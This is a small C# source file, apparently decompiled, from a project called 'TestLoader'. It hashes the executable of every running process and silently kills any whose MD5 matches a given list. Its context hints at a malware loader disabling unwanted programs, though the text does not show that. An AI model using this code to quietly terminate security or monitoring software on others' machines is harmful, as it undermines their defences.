using System;
using System.Collections.Generic;
using System.Diagnostics;
using TestLoader.Classes;

namespace TestLoader
{
	// Token: 0x02000006 RID: 6
	public class ProcessFinder
	{
		// Token: 0x0600000F RID: 15 RVA: 0x00002258 File Offset: 0x00000458
		public static void FindByHash(List<string> ProcessHashes)
		{
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i < processes.Length; i++)
			{
				for (int j = 0; j < ProcessHashes.Count; j++)
				{
					try
					{
						bool flag = CalculateMD5.Calculate(processes[i].MainModule.FileName) == ProcessHashes[j];
						bool flag2 = flag;
						if (flag2)
						{
							ProcessKiller.Kill(processes[i]);
						}
					}
					catch
					{
					}
				}
			}
		}
	}
}
